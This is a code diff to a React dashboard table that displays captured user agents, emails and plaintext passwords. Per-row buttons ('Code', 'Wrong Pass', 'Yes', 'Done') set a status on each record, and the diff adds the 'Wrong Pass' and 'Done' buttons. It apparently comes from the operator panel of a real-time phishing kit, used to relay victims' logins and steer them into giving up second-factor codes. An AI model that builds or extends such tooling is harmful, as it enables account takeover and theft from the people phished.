@@ -70,7 +70,10 @@ export default function DashboardDataTable() {
             }}
             className="border cursor-pointer px-4 py-2"
           >
-            {item.userAgent}
+            <div className=" md:hidden">{"User Agent"}</div>
+            <div className="hidden md:block">
+              {item.userAgent.split(";")[1].split(")")[0]}
+            </div>
           </td>
           <td
             onClick={() => {
@@ -81,7 +84,8 @@ export default function DashboardDataTable() {
             }}
             className="border cursor-pointer px-4 py-2"
           >
-            {item.email}
+            <div className="md:hidden">Email</div>
+            <div className="hidden md:block">{item.email}</div>
           </td>
           <td
             onClick={() => {
@@ -92,92 +96,89 @@ export default function DashboardDataTable() {
             }}
             className="border cursor-pointer px-4 py-2"
           >
-            {item.password}
+            <div className="md:hidden">Password</div>
+            <div className="hidden md:block">{item.password}</div>
           </td>
-          {item.state === "pending" ? (
-            <td className="border px-4 py-2 min-w-10">
-              <div className="flex items-center justify-center   gap-2">
-                {pending.state && pending.index == index ? (
-                  <div>Pending..</div>
-                ) : (
-                  <>
-                    <button
-                      onClick={async () => {
-                        setPending({
-                          state: true,
-                          index: index,
-                        });
-                        let code = prompt("code");
-                        await changeState(item._id, "code", code);
-                        await getData();
-                        setPending({
-                          state: false,
-                        });
-                      }}
-                      className="bg-blue-600 rounded-3xl py-1 px-3"
-                    >
-                      Code
-                    </button>
-                    <button
-                      onClick={async () => {
-                        setPending({
-                          state: true,
-                          index: index,
-                        });
-                        await changeState(item._id, "yes");
-                        await getData();
-                        setPending({
-                          state: false,
-                        });
-                      }}
-                      className="bg-blue-600 rounded-3xl py-1 px-3"
-                    >
-                      Yes
-                    </button>
-                  </>
-                )}
-              </div>
-            </td>
-          ) : (
-            <td className="border px-4 py-2 min-w-10 ">{item.state}</td>
-          )}
-          {/* {item.state === "pending" ? (
-            <td className="border px-4 py-2 flex flex-col gap-1">
-              {pending ? (
-                <div className="text-red-500">pending...</div>
+          <td className="border px-4 py-2 min-w-10">
+            <div className="flex items-center justify-center flex-col   gap-2">
+              <span className="text-lg font-bold">
+                {item.state} {item.state == "code" && " : " + item.code}
+              </span>
+              {pending.state && pending.index == index ? (
+                <div>Pending..</div>
               ) : (
-                <>
+                <div className="flex gap-2">
                   <button
                     onClick={async () => {
-                      setPending(true);
+                      setPending({
+                        state: true,
+                        index: index,
+                      });
                       let code = prompt("code");
                       await changeState(item._id, "code", code);
-                      getData();
-                      setPending(false);
+                      await getData();
+                      setPending({
+                        state: false,
+                      });
                     }}
-                    disabled={pending}
-                    className="bg-blue-700 py-2 px-5 rounded-3xl text-white"
+                    className="bg-blue-600 rounded-3xl py-1 px-3 text-sm md:text-md "
                   >
-                    {"code"}
+                    Code
                   </button>
                   <button
                     onClick={async () => {
-                      setPending(true);
-                      await changeState(item._id, "yes");
-                      getData();
-                      setPending(false);
+                      setPending({
+                        state: true,
+                        index: index,
+                      });
+
+                      await changeState(item._id, "inCorrect");
+                      await getData();
+                      setPending({
+                        state: false,
+                      });
                     }}
-                    disabled={pending}
-                    className="bg-blue-700 py-2 px-5 rounded-3xl text-white"
+                    className="bg-red-600 rounded-3xl text-nowrap text-sm md:text-lg py-1 px-3"
                   >
-                    {"yes"}
+                    Wrong Pass
                   </button>
-                </>
+                  <button
+                    onClick={async () => {
+                      setPending({
+                        state: true,
+                        index: index,
+                      });
+                      await changeState(item._id, "yes");
+                      await getData();
+                      setPending({
+                        state: false,
+                      });
+                    }}
+                    className="bg-blue-600 rounded-3xl py-1 px-3"
+                  >
+                    Yes
+                  </button>
+                  <button
+                    onClick={async () => {
+                      setPending({
+                        state: true,
+                        index: index,
+                      });
+
+                      await changeState(item._id, "done");
+                      await getData();
+                      setPending({
+                        state: false,
+                      });
+                    }}
+                    className="bg-green-600 rounded-3xl py-1 px-3"
+                  >
+                    Done
+                  </button>
+                </div>
               )}
-            </td>
-          ) : (
-            <td className="border px-4 py-2">{item.state}</td>
-          )} */}
+            </div>
+          </td>
         </tr>
       ))}
     </tbody>
